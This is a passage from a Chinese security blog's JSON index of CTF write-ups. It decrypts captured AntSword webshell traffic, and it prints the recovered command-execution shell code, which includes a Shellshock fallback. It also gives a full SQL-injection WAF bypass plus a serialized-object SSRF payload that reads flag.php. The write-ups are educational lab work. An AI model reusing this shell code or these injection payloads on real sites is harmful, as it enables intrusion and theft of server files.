forever!!!!!!!","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"安恒月赛流量分析","slug":"安恒月赛流量分析","date":"2020-04-28T14:36:49.000Z","updated":"2020-04-30T07:37:18.180Z","comments":true,"path":"2020/04/28/安恒月赛流量分析/","link":"","permalink":"https://polosec.github.io/2020/04/28/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/","excerpt":"","text":"经过一下午的奋战，弄明白了awdshell这道题，下面说一下思路参考链接：https://xz.aliyun.com/t/6701https://mp.weixin.qq.com/s?__biz=MzI0MDI5MTQ3OQ==&amp;mid=2247483852&amp;idx=1&amp;sn=3cd3f667523550d414fad97231eeeaea&amp;chksm=e91c5a34de6bd3223f5c3e69aa12311be39d4c13ee8d222ddb81f97070c74698dc7ae7fcecba&amp;mpshare=1&amp;scene=23&amp;srcid&amp;sharer_sharetime=1572778022447&amp;sharer_shareid=3bdf1b0c76d4c1691e700c57f87d9c0a%23rd用到的知识：PHP OPENSSL，wireshark抓本地包（npcap），AES，wireshark流量分析、过滤语法、蚁剑RSA 解题过程导出HTTP对象首先常规操作就是导出http对象，发现有个upload.php，发现传了个不认识的马，写了公钥，考虑RSA加密。 可以确定，传了个马，思路的重点应该向与马的交互上考虑。 流量分析通过过滤数据包，确定了上传后的文件命名为1581335771.php，于是在数据包中重点观察与该文件的交互。使用过滤器，语法：http and ip.dst==139.224.112.182 and http.request.method==POST 按个追踪HTTP数据流看看呗，看看有啥有用的信息没。追踪29543包的时候，发现了字符串L3Zhci93d3cvaHRtbC9hZG1pbi91cGxvYWQv，可能是base64，解一下发现是/var/www/html/admin/upload/，应该是文件的上传路径。剩下的HTTP流挨个追踪，返回的数据都是加密后的，返回数据暂时没有什么有用的。于是继续注意发送的数据。在追踪倒数第二个HTTP流的时候，发现了一些蛛丝马迹。发送的数据那有Y2QgIi92YXIvd3d3L2h0bWwvYWRtaW4vdXBsb2FkIjtjYXQgZmxhZztlY2hvIFtTXTtwd2Q7ZWNobyBbRV0=，经解密后发现是cd “/var/www/html/admin/upload”;cat flag;echo [S];pwd;echo [E]，这里可能藏了flag。所以应该对该数据包发送的数据进行还原。 流量还原由于导出HTP对象的时候有个公钥，考虑非对称加密（RSA），结合题目给的关键字ant与给出的shell的格式，可以确定这是用蚁剑连的shell，并且发送数据经过了RSA加密。可以写个脚本把发送的数据还原出来。 1234567891011121314151617181920&lt;?php$ant=&quot;GmFJzJHcsMOZxeGvb3Ulf4Y8e5RRhttAV1bsfypbvQAJW8IRFcqDVoXtyiclZwz2qXdQN8ivFYNqNxhkwtjbB7OitVLgULBfWlOnwtufxvmbmO4u8WlINbPbf/DbAy0Qx3GjBMFpFzrCkKINOfWQ5JqSD1EPx6sM9Cu1VkX5nus=|nL6Ds9dWn+UW5Jb0JAhoTb4rqPJJKbgcPNJfXLP1AKPbWHVE0JFSjClsnXWmFPXfeqPdKqcYxb/14hEwFzs51N5f6+NowrGHjYT+ObPKXpYxzg0vkCMihUMA7DI2YPUWEyPdvoIFg/bW5S3MommwKN9epOto55dtq6Pnb8NEHzY=|S4ic8EaKa3zEkRd7qsTGDs7uf3qiU1UVZE4fheQz3iq1HkiY6rIvAdtvcmsBF5aJWjdA/U2py1Mz105F2Tzm4dDX2Ag/rhX4ysiP8NJDEp+I55R0dfJu6szTOr3O2OTaUQK7iSYT4PKHjdo+rgeHK3hWzzMFAs6i2R9E81vz9WE=|FNCwxF7bDPNgizk4oa7bq4xbIObNCZNYNBdrTLMbYegWZ6FVYi54TLuABR/nkDLXq38cT099hjajM4iY+VL4g8tBRP++4LyPcSyzyC6mDtshAlmQtFteq4sGb+3IilDPekURxQ5RodRGBPtHr+nCNICbgmbqNaYKcVJRfMoK3q8=|m+nGWL1bOFJzaYeT54FtW12U3dWPZk5PJa91+YTtLn9Wg1c8JEf0FzI+YlBtpp6pW0fT7FfbTiJhQsv3f97bb3d+Cs7A5dM/ZG5YXDoDHGhRJKw0+TTHRIm3PH4fnbQNI8zhi5+9t2+0ueujAuXkk8i73A4lH36uKJFloL6yqs8=|YsyuPkbRlpDWwjhlkTThQN9GQXGkkzyNSFoxs5IfsRbbO7ZHphlFhL4yYsRYAgp8MkMJ64x7NfIGoVgDJnA1YgORiJOf8GP/p/28MLOuscy1SVN/lLnJzbhmf/7vfg0/Q94QAEWk2TOgSil0h3JDsgQYqDtFFldHWDnqEvYlWZI=|C2ZaL3MQWCQBmNcq8xAxxlhvXzUxo0qBz2PUIqBIMcKNJ3sgxU+RTqSwYoqPTDAg3//7rNa+dkinRAidD8GjrcSBd5qdbTLQlWZGME9Lv6JEFt0udTU0FVrhV/ctPz+z1NN5P4pN1tj35sNKsyfYH1kq13A+3dYk0wZlMU9KIFI=|l65yWzb3A97Cdu0wdn59Hiag/Um4/LZTrolCjwo9d7/J3Z9stTkaEtLe2XBdVQZsipUfnW2o7JWgQNo0TUbGWIv2H5wKGaTfPm7OTSkm+ao48Nn1d/+yME+RLudQqbmYREMAJFviNJST+H4Q+MqyngjMeGrb5jmlw0eQZ/MUx5Q=|EYwu5Y3rgl8k2KrPZjnGPWjriLI1mDeJwA4KhjvJ4wQs9Xx+ITDsxBr0eMfL/Km95ykbfMlZcrSzonx5hLiE2YLwDjX/cIIZxqzZXkEYq00AdAPrFnhFVdvJn/SHQ1LdGHgAN88Y2EOZOPM8ZXima61BxCY44TlrezIbBj4+eQ0=|Z2/dEUju0jw63PMHCK9CAG+tHmwiH0t3GraGPCes4TZT5hIfv6kHMTOgMthTK6sd5qy+EVw6d1Qxh03WMHVH0gR2aYqEl1RdYwQpN0NPsSM+fETsag3nQ4oV3VniGlaMmdFIiYatNvKNl7tOcapklyxEEIA0Jc33O7FDjUXKiHU=|YEVG5OctKJXP1Z7kywDJGrmb7BvXW/C3iQudtTCLgUIbMhXFq90wLvW7No7ZoqhY/Mh1XlJKtkBZJWEbsORW23hxvA5LCb/edsfJmIxWtj5cRG9g66j3BiEUPDjvtYi6beUjUtKmuSInELTkmIKf1jo5qyZE+VcWC4HfAT0wbFw=|ii/O42J/+ko4xPNfNuunKR7gyji/wtaiMcKMzQM2Qg7KZE/+xAcLX3Znh55OwgsfaTX6AedF+L/1hwMp9zigbvXorSE0TNay//nVlcnhhC4snAu2/hjXNoI3OnnWlfFFLYOj5v+1LN1nCU/UzoHV6/w1/4bVz7Maovj14BfXklI=|eay1qqOy5QmJmStB9EH4JKPms1In5agVigegn5/1IZS+0QpBgK37mWg02rspbMz20brtSgsv2PhJ3gMTFg3ib7z0cQZPvcNV6DTZwSHbUO2M1uQetssYMMnBPPulwLhTkND4SzwSsgDLS6m8TxbHL0qpZRcnNo2sMy478S5DkvM=|e4qLRtta2W6ItXy3HNgpYuQuSSzpsvq+SUfoRKWM8Z5QdiBeleS/YDGP0VZqRJh3CPMC6vbegwB7qNLAt6czTsHQTdTAJBLr5g4oTDc9Sxlk8A7vvK0ljLSgKjNw5s3BDa03jINPkc5BbDkrTaXMq01Bqcu5DPTTA0pO/Z9oq1Q=|RBdZrEGknOK+PCuQ1F2eTxKvAi50XD/Z1ccAItPJ+48VlSbOTZa/wkdr82K8LE56z0E4JtZDBVSj9I4TurU2bbmfCjKXGw9xlagS7YMr/hfyCy/2hrVveAkaBZDAtmnrM4nGpFxVpzArl124XlqEzh9cSS9LAnwkNm8j05D6mDc=|aZpV5K4m1Rwxd/Y9eOfJ0bRpIZybj2tSjuAEJI7Il/EV9ZC0pXLIkgWviG40pXQFGoEwGex7f0j/Je4ldLRKnrpsyZ+/3mZtHnHL4gepf+iVaULQ8jdHTVVnM1t4qLJk+RnhYbuFjcUy5Yo6rn0Cju8sPIdpEwvi8fvetIOGVJE=|fPGROe6VaAwzqmNuk86fnWT4LqandXTwuewTC80zI8xTFSj1S6YMxPROTHS94gXlCcLTfFjEW2VpH2tyANX1FBIw5sSjsuS6CQKuqiQo6ID975H5Ox+KkJs6XLP/l5Or34U3rryHzBooTrXQlDl21qoPBLdj5URgGrEq7wrvLVA=|jp3lUm3Gz2eZpB5zghEGom2syK8nBymkc6h3pKE/mIS8KW6gD2OFSEneFERI0jy26kVOBhxr3ZHY3WoL6s5aJepTuY7D6Dpz/REI+FzR2PlCo0WvyLQdOphMgbYef1SyYr1+DWK/JxxFjxtfVRZlwL7+OyHQjQ05oVHyq6juSEI=|h8tsCCKgjChZ5U/sZxeVPiF8hO+cB6qqfeWnTAMydEcLmR0iwvHcarZw4g2WH2ASvwIN0av4GzLSu2QtOM1u0y/OuVX3v9/Vp+nNMZ/Dog0NUxFIPD1HTgaK3w7DdnA6B6i26JooWAxKlTFgYmr0x7K53pmM6B8wVQu/ADsbFBE=|CdejrTSVZhSgL+3bhPQyuL7ho71i+L8VvpwNg+D84YnKdwbbbfgqIMu+gefCBmyzvhbhEeGR16/T/fZ4bkneak+fzZpgUrejrFbOETG2Rg9zViznPwBdku9FTlWUybaRD0CHKeY7nE93/G2yXWSpuk/7P594cAPi1qd2WnEbaBc=|Hnxjy7ZSfmn6B59Kv7VXu1mhtYdgGbOtsLsLqDX6K1dKhtHsGx0guy03qwqRA0XElDdJ3Dvgqi5lgb8SY6MiDf1c9u870K8S9xVTn6Y0lbZgtvPoDrobEiT6tGEQCRsUuXB6jbUTgnNPmaDAuidQZqdsSBIGZwQyzycgxHmaDuE=|Imz1om4RRCU1Wnyowe5SYFtICyD1BODveyZ497yURKcyMgoogUxi0cPCiyexdD9ciNYk6DGyimegT7zMeIA5oGfNg2EHbzuBJeSc4wqLCJtSmTe66inu3dqC4IDxt2ghkgFLSQZWqNOKOgUt1b5wgy3O/Y3iIzS888TuFSDm+RQ=|jldlrb8EHvWiKi5E/HBIrn4UUnzMZO8+6ugZ7hjZTtWI5Vg9EeWdmITpEpOQIWIXpOUhaI+VydVcom8e7Fe6gR6u4RPy5ChmFgjZhT03gwwNXzJeiaE6x7ZZjXGBZA3Lwu5gRns3s+hTM0Tm2vrhGOQDB41hDDi4N/Yb3MRn0PM=|UJKgd4FCzzzMeQEq+w3S17+3d+g9mM3JM2qZWkWHOIF3L/EiWpRhm18DuaWJ7veqQSA5pb3KGH9rKDvj2KHIDTUHl0gCiH1U5qeD+WqXFvLahN5O8ecrfgflUUip1SdE6aL6dYqzyplxF+qy3BVr2dKq+6UYlUiA5Bmn2lXSIyM=|LClEAJBfCO7HMhlu0ASDbetkR7sP4aOx9a/P4P0L5kLeGYrlrK4Qg3ZNl7Fd/gQ8KXAKs90XRE62pfZidMX1A4xj/IokC6nkXCNUIzi0PWPWdCzcBNiswbQtsTZhElecl8RyfaOSvxsiKclTvKbZYfQI5r0p0asBs5gKnK0FpT4=|paMu+DWwNp+5GRSiGn4QfFaS/ffXXKuBgP/qzsixnnBWMeXIVy/HT23Xdoc7/OdlIH8/rBKdrJt+7o6XUAbRGzND9sEuf0Ldh5npWln/EhSkGq+bqt1hDfmwwsoo2GJcNDHBhz6lQq2M4zoa9E9d04T3N/SE+3B7LFb0cxLE8aA=|Cz+hQca9uYZJPPJusvE1G8X12VF5iPFM83nOnszF38XQziVKd+D83N4IvoJPNdJLEtgbycIpg1bo5auK1u9n2Pv8z1jFHoaTzmPgDBFiAAv3NGd0m2vg09QwRxq84PD9Ey0dwT7C1w2e6M9wGJ6DoIhPhZQgvUKMyrmCAVmMo18=|h59BqEgdFq4a1HegvdVKeMWwiwQMQsaSzYOxbNCiPuCRGknF8dHHkQboB65gnjbNBDPVpiVoDBMDV+1sCc1yM8zqC494bDS7iopf/U3BBnZS2wCxeo1x78DUiEgzP6ILomxrhrMY2y5R9IbmhJQVkpiqMhPaCvvHzOZO6Pz9SHg=|gUSFO4uVnPAI4UVTKCdBqH/rD6BZZFPfhsVOzga0ohjOJhXW+pvAu4GSh+3FIGn6cpxBUILbsLjBSgmscqAbKV/nHRnQ8HjQUgnu5YM8KikKJV35OMt1Mo1P/qlF5bwzI969XDtUHtClPkznXuO4HyvGLj0/mJj0IauhxfDKhyU=|jkhijGHqR86l+YGh7fldHrzLfam9LUYfRt2nrqqgeqCoE6KO8khatGkzLPk8QgIjLti6P6d7AwwPdVLX3gsfv6bBhT26qUR1u5+AA8foNt5tH6Ej33OODcnkxcp19eFu+zWRG1zUDkBs5qtCJvZKnpSPFKxJ6Z2g0RAoKF3pqbY=|QayQ2dVrEz8KBgpVQjGRNbpRHgFhVK3e89fEzEKzlclezrZ7CBgjB6/Y0PPYSIeZldFEZficAzHXs+bFHALEMrkJlRMk36FMuqtn0YVs4cVy8AHxjb8QnJD9gsFC6q2EWmRo8w4ZdBvg1xyeg3D0vhOcZgNk78BGoSU2HhHK5xY=|Ncgk0CAlnik6xDFINohB1EqgT7tS8COpia8O9cuvi53lNlQWY4IWG2oZMgzNWeU/m8QL+EGqhrD6IflJDD/hDO/IFC6D2DEjeMofqJ/6sHXAt2lIV129SeUUjGdrxyxeWDtqu6iBDdDBtyfPVfeI/DMYOh46XkR0Wk5nBU2N7+U=|lOxi5A2Z8sa8+aw5rQm0g6gqukXMlwvLV7ykEiGWFRqFqDaRPnkVI8diKsvgBg0Btk94gXt2FX1polSNgIJL3E6GW9loo2OMSGBBg1KJ/6VC/DpLWy44VbZhrUB//hiXo3xua6h2DRDi4h5eFkkf2ZIjGjZBi+AqHQINUbetN54=|DRBn6EF3Eoj+wpOX2xhKhkrypPB+d2+8PyHzXwKL8QmOeaRufeCZ1/7Id4TQPXiRXOYsPDXVLr1tUWAUNfqIQisGxSL8lAgg9LzYNYxRUejuTsP2WmVSO21cYXTPlNYjJDR+BkTtOlAvBBp3fjwhOVlr1khuzAhl2Y799drdSFk=|VIJ6dfEfxNcc1eWhAL0dMWXkGSCnBqv+I+Hqs7mGdK9CG3sMH1LyhIEsYg/UPccftYAPeIqKitOpj4OlNbGQMlf8AIJgFvNceAl7HCwqf/6ggZzfcBx5r4HpCBI3cB2zOOOlX9AFVRcunk3rCZSsaeQ8QGsLC1q/2EImzQqSB5g=&quot;;$pk = &lt;&lt;&lt;EOF-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCmXoXBvXeanxgl51HBm2J6HPNhTQtfb8ICioE+n0Ni0DlBFHSBprbsWYKJywVfdhJbLDCCon68uA1UYuy0yteDog3jOdweW2bscEGmeMXLQJfBHpQrg4wWoYJjD3QsKorYT6kdp1LRkuHE3PbpqvRtqO7ALzrcBi88Eu7oZaPANwIDAQAB-----END PUBLIC KEY-----EOF;$cmds = explode(&quot;|&quot;, $ant);$pk = openssl_pkey_get_public($pk);$cmd = &#x27;&#x27;;foreach ($cmds as $value) &#123; if (openssl_public_decrypt(base64_decode($value), $de, $pk)) &#123; $cmd .= $de; &#125;&#125;print_r($cmd);?&gt; 还原后的数据是: 1@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);function asenc($out)&#123;@session_start();$key=@substr(str_pad(session_id(),16,&#x27;a&#x27;),0,16);return @base64_encode(openssl_encrypt(base64_encode($out), &#x27;AES-128-ECB&#x27;, $key, OPENSSL_RAW_DATA));&#125;;;function asoutput()&#123;$output=ob_get_contents();ob_end_clean();echo &quot;f3c7239848e0&quot;;echo @asenc($output);echo &quot;05fda2646c&quot;;&#125;ob_start();try&#123;$p=base64_decode($_POST[&quot;t185a78b977a47&quot;]);$s=base64_decode($_POST[&quot;wd0b7c7ca226cb&quot;]);$envstr=@base64_decode($_POST[&quot;b8dcb72ce2ba93&quot;]);$d=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);$c=substr($d,0,1)==&quot;/&quot;?&quot;-c \\&quot;&#123;$s&#125;\\&quot;&quot;:&quot;/c \\&quot;&#123;$s&#125;\\&quot;&quot;;if(substr($d,0,1)==&quot;/&quot;)&#123;@putenv(&quot;PATH=&quot;.getenv(&quot;PATH&quot;).&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;);&#125;else&#123;@putenv(&quot;PATH=&quot;.getenv(&quot;PATH&quot;).&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;);&#125;if(!empty($envstr))&#123;$envarr=explode(&quot;|||asline|||&quot;, $envstr);foreach($envarr as $v) &#123;if (!empty($v)) &#123;@putenv(str_replace(&quot;|||askey|||&quot;, &quot;=&quot;, $v));&#125;&#125;&#125;$r=&quot;&#123;$p&#125; &#123;$c&#125;&quot;;function fe($f)&#123;$d=explode(&quot;,&quot;,@ini_get(&quot;disable_functions&quot;));if(empty($d))&#123;$d=array();&#125;else&#123;$d=array_map(&#x27;trim&#x27;,array_map(&#x27;strtolower&#x27;,$d));&#125;return(function_exists($f)&amp;&amp;is_callable($f)&amp;&amp;!in_array($f,$d));&#125;;function runshellshock($d, $c) &#123;if (substr($d, 0, 1) == &quot;/&quot; &amp;&amp; fe(&#x27;putenv&#x27;) &amp;&amp; (fe(&#x27;error_log&#x27;) || fe(&#x27;mail&#x27;))) &#123;if (strstr(readlink(&quot;/bin/sh&quot;), &quot;bash&quot;) != FALSE) &#123;$tmp = tempnam(sys_get_temp_dir(), &#x27;as&#x27;);putenv(&quot;PHP_LOL=() &#123; x; &#125;; $c &gt;$tmp 2&gt;&amp;1&quot;);if (fe(&#x27;error_log&#x27;)) &#123;error_log(&quot;a&quot;, 1);&#125; else &#123;mail(&quot;a@127.0.0.1&quot;, &quot;&quot;, &quot;&quot;, &quot;-bv&quot;);&#125;&#125; else &#123;return False;&#125;$output = @file_get_contents($tmp);@unlink($tmp);if ($output != &quot;&quot;) &#123;print($output);return True;&#125;&#125;return False;&#125;;function runcmd($c)&#123;$ret=0;$d=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);if(fe(&#x27;system&#x27;))&#123;@system($c,$ret);&#125;elseif(fe(&#x27;passthru&#x27;))&#123;@passthru($c,$ret);&#125;elseif(fe(&#x27;shell_exec&#x27;))&#123;print(@shell_exec($c));&#125;elseif(fe(&#x27;exec&#x27;))&#123;@exec($c,$o,$ret);print(join(&quot; &quot;,$o));&#125;elseif(fe(&#x27;popen&#x27;))&#123;$fp=@popen($c,&#x27;r&#x27;);while(!@feof($fp))&#123;print(@fgets($fp,2048));&#125;@pclose($fp);&#125;elseif(fe(&#x27;proc_open&#x27;))&#123;$p = @proc_open($c, array(1 =&gt; array(&#x27;pipe&#x27;, &#x27;w&#x27;), 2 =&gt; array(&#x27;pipe&#x27;, &#x27;w&#x27;)), $io);while(!@feof($io[1]))&#123;print(@fgets($io[1],2048));&#125;while(!@feof($io[2]))&#123;print(@fgets($io[2],2048));&#125;@fclose($io[1]);@fclose($io[2]);@proc_close($p);&#125;elseif(fe(&#x27;antsystem&#x27;))&#123;@antsystem($c);&#125;elseif(runshellshock($d, $c)) &#123;return $ret;&#125;elseif(substr($d,0,1)!=&quot;/&quot; &amp;&amp; @class_exists(&quot;COM&quot;))&#123;$w=new COM(&#x27;WScript.shell&#x27;);$e=$w-&gt;exec($c);$so=$e-&gt;StdOut();$ret.=$so-&gt;ReadAll();$se=$e-&gt;StdErr();$ret.=$se-&gt;ReadAll();print($ret);&#125;else&#123;$ret = 127;&#125;return $ret;&#125;;$ret=@runcmd($r.&quot; 2&gt;&amp;1&quot;);print ($ret!=0)?&quot;ret=&#123;$ret&#125;&quot;:&quot;&quot;;;&#125;catch(Exception $e)&#123;echo &quot;ERROR://&quot;.$e-&gt;getMessage();&#125;;asoutput();die(); 代码审计在这一串代码中可以发现有几个关键函数：asenc(),asoutput(),发现输出的内容是f3c7239848e0+asenc($output)+05fda2646c，asenc里面是用AES-128-ECB加密，key是session前16位，去包里找就行。 数据还原接下来需要做的就是还原数据，通过代码审计可以知道base64(AES加密（base64(out)）)后的内容是+L8pc9pJEhqPQ1cmL18eJXX9QGADkKnp8A1j7s4oX2Qo8YJNGNTbuaXu+OfynYgRewqyfLj/Wrg0rgKj/cRdO4zJMmfLfyFVB4pBRYeTetM0G/w/Px6+xI/WPlRrx/+MvK6eQyPr+xDqTX82AqiGrOYDwN94/vuGcLS7NAxhty4=把这个解密就行了。解密方法： 12$res=base64_decode(&quot;+L8pc9pJEhqPQ1cmL18eJXX9QGADkKnp8A1j7s4oX2Qo8YJNGNTbuaXu+OfynYgRewqyfLj/Wrg0rgKj/cRdO4zJMmfLfyFVB4pBRYeTetM0G/w/Px6+xI/WPlRrx/+MvK6eQyPr+xDqTX82AqiGrOYDwN94/vuGcLS7NAxhty4=&quot;);$res=openssl_decrypt($payload, &#x27;AES-128-ECB&#x27;, $k,OPENSSL_RAW_DATA) 然后再做两次base64解密就可以得到flag了。(cat flag里面的文件也是base64加密的) 题目总结这道题有点麻烦，主要是不了解蚁剑的流量特征。在awd中shell的免杀与waf永远是在不断迭代升级的。还需要学习的姿势有很多，应该多分析流量，总结特点。 蓝牙数据包蓝牙这道题我一开始看到没什么思路，因为没有学过蓝牙相关的协议。于是从网上现学了点，发现传输数据使用的协议，搜了搜协议名还真搜出来个.7z文件。搜出来之后把这玩意十六进制导入到010editor还原成.7z，提示需要输入密码，首先考虑伪加密，发现不是（其实360会自动修复伪加密）然后看文件名提示了密码是蓝牙的PIN，于是在包中搜索“PIN”。第一次搜索其实我搜到了。。但是没找到PIN,刚想爆破（PIN纯数字，位数少，好爆破）的时候朋友说你搜”PIN”就行。。。我。。吐了。搜到PIN之后解压文件得到flag。","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"20200421学习笔记","slug":"20200421学习笔记","date":"2020-04-21T14:32:41.000Z","updated":"2020-04-21T16:14:27.758Z","comments":true,"path":"2020/04/21/20200421学习笔记/","link":"","permalink":"https://polosec.github.io/2020/04/21/20200421%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"今天做buuoj做了一道web题，总的来说考察到了SQL注入、SSRF、反序列化的知识点。这三个考点我都想到了，但是一块考我是没想到的。参考链接：https://blog.csdn.net/weixin_43818995/article/details/104529233https://blog.csdn.net/weixin_45425482/article/details/103868660https://www.cnblogs.com/appleat/archive/2012/09/03/2669033.htmlhttps://www.w3school.com.cn/sql/sql_union.asp 知识铺垫MYSQL UNION SELECT ：比如select username,password from user union select 1,2UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名。可以先根据orderby判断字段个数，判断完字段个数后根据union select 1，2，3…判断在哪儿显示。对union UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名 这句话的举例： MYSQL CONCAT GROUP_CONCATconcat(str1,’separator’,str2) // separator是分隔符可以在结果中连接多个字段 比如下图举例 连接username,password为一个字段。 group_concat()GROUP_CONCAT函数返回一个字符串结果，该结果由分组中的值连接组合而成。简单的来说就是把查询到的数据丢到一行显示，在注入的时候就不用一个个limit了。比如查表名：select group_concat(table_name) from information_schema.tables where table_Schema=数据库名 一条可以查到该数据库所有的表名 SSRFphp的curl未经严格过滤可能导致SSRF（利用file协议。） 题目分析进去之后注册，注册完不知道有啥用了，打开扫描器扫一下，扫到了robots.txtrobots.txt提示了有个user.php的备份，下载下来。 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpclass UserInfo&#123; public $name = &quot;&quot;; public $age = 0; public $blog = &quot;&quot;; public function __construct($name, $age, $blog) &#123; $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog; &#125; function get($url) &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) &#123; return 404; &#125; curl_close($ch); return $output; &#125; public function getBlogContents () &#123; return $this-&gt;get($this-&gt;blog); &#125; public function isValidBlog () &#123; $blog = $this-&gt;blog; return preg_match(&quot;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i&quot;, $blog); &#125;&#125; 对该文件分析可以发现存在SSRF利用点，其他的暂时没想起来。然后看一下/view.php注意url，穿了个参数。。maybe注入？给个-1试试：报错。把绝对路径爆出来了：/var/www/html/view.php再查查试试：-1 union select 1,2,3 给waf了 过滤了啥不知道 挨个试试，应该是过滤了 union select,把空格换成注释绕过。union//select成功绕过。接下来就是判断列数，查数据库名，查表名，查字段。。http://7f8c0885-83d5-462e-b56a-175f6b06308b.node3.buuoj.cn/view.php?no=-1%20union//select%201,group_concat(column_name),3,4%20from%20information_schema.columns%20where%20table_name=%27users%27 这是查字段然后查data字段 http://7f8c0885-83d5-462e-b56a-175f6b06308b.node3.buuoj.cn/view.php?no=-1%20union/**/select%201,group_concat(data),3,4%20from%20users发现数据是O:8:”UserInfo”:3:{s:4:”name”;s:6:”123123”;s:3:”age”;i:123123;s:4:”blog”;s:13:”www.baidu.com&quot;;}眼熟不？序列化后的数据？是不是该想想反序列化的问题了？然后读备份的代码，我们应该利用getBlogContents（）方法进行SSRF,内容为file://var/www/html/flag.php，那么注册的时候能填这个不？当然过滤了。所以，我们猜测，完整的流程应该是这样：用户注册http开头的blog，把对象序列化后存入数据库，当用户查询的时候，查询到序列化数据反序列化，然后交给getBlogContents（）方法去用curl发送请求。我们要做的就是让数据库查到的请求返回的是我们恶意构造的序列化对象，该对象的blog为file:///var/www/html/flag.php。就是要把 O:8:”UserInfo”:3:{s:4:”name”;s:3:”123”;s:3:”age”;i:0;s:4:”blog”;s:29:”file:///var/www/html/flag.php”;} 这一串当作查询返回的结果，应该怎么办呢？UNION SELECT！注意与列对应（根据我们刚才查的列，知道data是第四个字段，所以把payload放到第四个字段上对应~）payload:http://7f8c0885-83d5-462e-b56a-175f6b06308b.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,2,3,%27O:8:%22UserInfo%22:3:{s:4:%22name%22;s:4:%22test%22;s:3:%22age%22;i:123;s:4:%22blog%22;s:29:%22file:///var/www/html/flag.php%22;}%27然后查看源码中的iframe，解密base64得到flag。 在上帝视角再看这道题为了证明我的思路是正确的，我利用SSRF漏洞获取到了db.php,user.php,show,php,join.ok.php下面是view.php的代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485&lt;?php session_start(); ?&gt;&lt;?php require_once &#x27;db.php&#x27;; ?&gt;&lt;?php require_once &#x27;user.php&#x27;; ?&gt;&lt;?php require_once &#x27;error.php&#x27;; ?&gt;&lt;?php$db = new DB();?&gt;&lt;!doctype html&gt;&lt;html lang=&quot;ko&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;User&lt;/title&gt; &lt;?php require_once &#x27;bootstrap.php&#x27;; ?&gt;&lt;/head&gt;&lt;body&gt;&lt;?php$no = $_GET[&#x27;no&#x27;];if ($db-&gt;anti_sqli($no))&#123; die(&quot;no hack ~_~&quot;);&#125;$res = $db-&gt;getUserByNo($no);$user = unserialize($res[&#x27;data&#x27;]);//print_r($res);?&gt;&lt;div class=&quot;container&quot;&gt; &lt;table class=&quot;table&quot;&gt; &lt;tr&gt; &lt;th&gt; username &lt;/th&gt; &lt;th&gt; age &lt;/th&gt; &lt;th&gt; blog &lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt; &lt;?php echo $res[&#x27;username&#x27;]; ?&gt; &lt;/td&gt; &lt;td&gt; &lt;?php echo $user-&gt;age; ?&gt; &lt;/td&gt; &lt;td&gt; &lt;?php echo xss($user-&gt;blog); ?&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;hr&gt; &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;p&gt;the contents of his/her blog&lt;/p&gt; &lt;hr&gt; &lt;?php $response = $user-&gt;getBlogContents(); if ($response === 404) &#123; echo &quot;404 Not found&quot;; &#125; else &#123; $base64 = base64_encode($response); echo &quot;&lt;iframe width=&#x27;100%&#x27; height=&#x27;10em&#x27; src=&#x27;data:text/html;base64,&#123;$base64&#125;&#x27;&gt;&quot;; // echo $response; &#125; // var_dump($user-&gt;getBlogContents()); ?&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 其中， 12$res = $db-&gt;getUserByNo($no);$user = unserialize($res[&#x27;data&#x27;]);//这句话也解释了为什么要对应第四个字段。 这两句话印证了我的思路：反序列化数据库中的data字段—存放的user，反序列化后调用getBlogContents()，在getBlogContents()中调用get(user-&gt;blog)，在这里面CURL请求，然后在前端输出base64加密的值。 总结我太菜了。综合利用还是不行，说明我每个点还没都弄明白。尤其是正则表达式，只能看个大概，复杂的就不懂了，还需要继续学习","categories":[],"tags":[{"name":"php","slug":"php","permalink":"https://polosec.github.io/tags/php/"},{"name":"mysql","slug":"mysql","permalink":"https://polosec.github.io/tags/mysql/"}]},{"title":"c++ memset","slug":"c-memset","date":"2020-04-20T14:12:08.000Z","updated":"2020-04-20T14:23:06.734Z","comments":true,"path":"2020/04/20/c-memset/","link":"","permalink":"https://polosec.github.io/2020/04/20/c-memset/","excerpt":"","text":"最近一直在做动态规划有关的问题，并且经常性的需要把dp数组置为0，就经常性的用memset(dp,0,sizeof(dp))这么写。。直到今天。今天遇到了一道题 需要把dp数组初始化为1，我就像往常一样写了memset(dp,1,sizeof(dp))，但是整体代码写完后怎么都不对 